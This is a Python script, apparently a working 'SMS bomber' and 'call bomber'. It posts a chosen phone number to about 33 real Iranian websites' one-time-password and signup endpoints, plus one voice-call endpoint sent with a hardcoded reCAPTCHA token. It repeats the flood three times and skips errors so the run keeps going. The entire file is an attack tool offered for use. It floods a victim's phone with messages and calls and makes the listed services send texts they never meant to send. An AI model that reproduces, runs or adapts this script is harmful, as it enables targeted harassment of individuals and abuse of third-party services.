import requests
import time


# SMS bomber
def bomb(number):
    # Our sites that send SMS
    sites = [
        ["https://cyclops.drnext.ir/v1/patients/auth/send-verification-token",
         {"source": "besina", "mobile": number}],

        ["https://www.portal.ir/site/api/v1/user/otp",
         {"template_id": 11111111, "type": "etc", "category": "etc", "mobile": number, "name": " "}],

        ["https://api.snapp.ir/api/v1/sms/link",
         {"phone": number}],

        ["https://www.sheypoor.com/api/v10.0.0/auth/send",
         {"username": number}],

        ["https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",
         {"cellphone": number.replace("0", "+98", 1)}],

        ["https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode", {"Parameters": {
            "ApplicationType": "Web", "ApplicationUniqueToken": "null", "ApplicationVersion": "1.0.0",
            "MobileNumber": number, "UniqueToken": "null"}}],

        ["https://api.divar.ir/v5/auth/authenticate",
         {"phone": number.lstrip("0")}],

        ["https://football360.ir/api/auth/verify-phone/",
         {"phone_number": number.replace("0", "+98", 1)}],

        ["https://virgool.io/api/v1.4/auth/verify",
         {"method": "phone", "identifier": number.replace("0", "+98", 1), "type": "register"}],

        ["https://www.snapptrip.com/register",
         {"lang": "fa", "country_id": "860", "password": "12345678", "mobile_phone": number.replace("0", "98", 1),
          "country_code": "+98", "email": "a@gmail.com"}],  # snapp trip

        ["https://gw.taaghche.com/v4/site/auth/signup",
         {"contact": number}],

        ["https://core.gapfilm.ir/api/v3.1/Account/Login", {"Type": 3, "Username": number.lstrip(
            "0"), "SourceChannel": "GF_WebSite", "SourcePlatform": "desktop", "SourcePlatformAgentType": "Chrome",
            "SourcePlatformVersion": "111.0.0.0", "GiftCode": "null"}],

        ["https://api.digikalajet.ir/user/login-register/",
         {"phone": number}],

        ["https://server.kilid.com/global_auth_api/v1.0/authenticate/login/realm/otp/start?realm=PORTAL",
         {"mobile": number}],

        ["https://api.tapsi.cab/api/v2.2/user",
         {"credential": {"phoneNumber": number, "role": "PASSENGER"}, "otpOption": "SMS"}],

        ["https://mobapi.banimode.com/api/v2/auth/request",
         {"phone": number}],

        ["https://api.ostadkr.com/login",
         {"mobile": number}],

        ["https://www.technolife.ir/shop", {
            "query": ("query check_customer_exists($username: String ,$repeat:Boolean){\n  check_customer_exists"
                      "(username: $username , repeat:$repeat){\n    result\n    request_id\n    }\n  }"),
            "variables": {
                "username": number}, "g-recaptcha-response": ""}],

        ["https://www.hamrah-mechanic.com/api/v1/membership/otp",
         {"PhoneNumber": number, "prevDomainUrl": "https://www.google.com/",
          "landingPageUrl": "https://www.hamrah-mechanic.com/",
          "orderPageUrl": "https://www.hamrah-mechanic.com/membersignin/",
          "prevUrl": "https://www.hamrah-mechanic.com/", "referrer": "https://www.google.com/"}],

        ["https://api.mobit.ir/api/web/v8/register/register",
         {"number": number}],

        ["https://auth.basalam.com/otp-request",
         {"mobile": number, "client_id": 11}],

        ["https://www.miare.ir/api/otp/driver/request/",
         {"phone_number": number}],

        ["https://api.vandar.io/account/v1/check/mobile",
         {"mobile": number}],

        ["https://taraazws.jabama.com/api/v4/account/send-code",
         {"mobile": number}],

        [f"https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone={number}",
         None],

        ["https://tikban.com/Account/LoginAndRegister",
         {"phoneNumberCode": "+98", "CellPhone": number, "CaptchaKey": "null", "JustMobilephone": number.lstrip("0")}],

        ["https://www.buskool.com/send_verification_code",
         {"phone": number}],

        ["https://api.timcheh.com/auth/otp/send",
         {"mobile": number}],

        ["https://api.sibche.com/profile/sendCode",
         {"mobile": number}],

        ["https://apiwebsite.shavaz.com/Auth/SendConfirmCode",
         {"mobile": number}],

        ["https://account.bama.ir/api/otp/generate/v2",
         {"CellNumber": number, "Appname": "bamawebapplication", "smsfor": 6}],

        ["https://pinket.com/api/cu/v2/phone-verification",
         {"phoneNumber": number}],

        [f"https://core.gap.im/v1/user/add.json?mobile=%2B{number.replace('0', '+98', 1)}",
         "Get"],

    ]

    # An SMS is sent every 4 seconds
    for url, json in sites:
        try:
            # If site SMS method is get
            if json == "Get":
                response = requests.get(url=url, timeout=3)
                print(url, "-", response, "\n")
                time.sleep(4)
            # Else if is post
            else:
                response = requests.post(url=url, json=json, timeout=3)
                print(url, "-", response, "\n")
                time.sleep(4)
        except (
                requests.exceptions.ReadTimeout, requests.exceptions.ConnectTimeout,
                requests.exceptions.TooManyRedirects):
            continue


# Calling bomber
def call(number):
    # Our call bomber site
    sites = [["https://api.digikalajet.ir/user/login-register/voice-call/",
              {"phone": number, "g-recaptcha-response": ("03AKH6MRGaYQlelcSA/R8S1u1DbQnaEvlsAB17X4IPxVLf9k40V1kgm28kvwc"
                                                         "sPiye-TD72H51yuyJiJBjRoJOt87L0BWoXCik2pRRuadnOTo0hWs4fjbrly-R"
                                                         "cXo_vvCdmffLRhrjYRf86SN4CuqXqnCSHhJ8sjRwNMTycjcL_uxpZd28V8XDX"
                                                         "95BVUOFQzH6lvmeffiHI8KpAQr-8UWvRYjBhLfi-JwJK0BJGJt118q9Em7EMI"
                                                         "wuN5kyUXMS2oBjORz2E_TPuVHjq65X_4oTRPxiN2-119XpYeB-AvwXk8q5v7r"
                                                         "Punbt1JzUHM_6a_xCtjsFscBbBlpo-VJWzJWZVJpxl9CgZAx8I4bkEquhKjOg"
                                                         "hnK3mjil3TN2ColewBCGmCnCdNy0tdL6Q53_txJOUFORBx7KGjtV28-n5xkIa"
                                                         "Kw39r3EMwc__OhPe56LORbTCj6Zjt8uH4y4c03mVEkkoO5-huuxBNiz4_j440"
                                                         "c3oAmuuB7A8P4-G2K5cJtDD-PHy1ZTH1WFdN0tJ_cox5-qXwXbOA1btJuJg9l"
                                                         "vICRbCxHytO6rfeG39EX1X4VGR43brxzVliub0P9ZWDTJOwnWj6FUAesecp86"
                                                         "hEA")}]]

    for url, json in sites:
        try:
            response = requests.post(url=url, json=json, timeout=3)
            print(url, "-", response, "\n")
            time.sleep(5)
        except (requests.exceptions.ReadTimeout, requests.exceptions.ConnectTimeout):
            continue


# for mixing sms & call
def both(number):
    # This code runs 3 times
    for i in range(3):
        call(number)
        bomb(number)


if __name__ == '__main__':
    phone_number = '09999999999'  # Enter your phone number here
    both(phone_number)
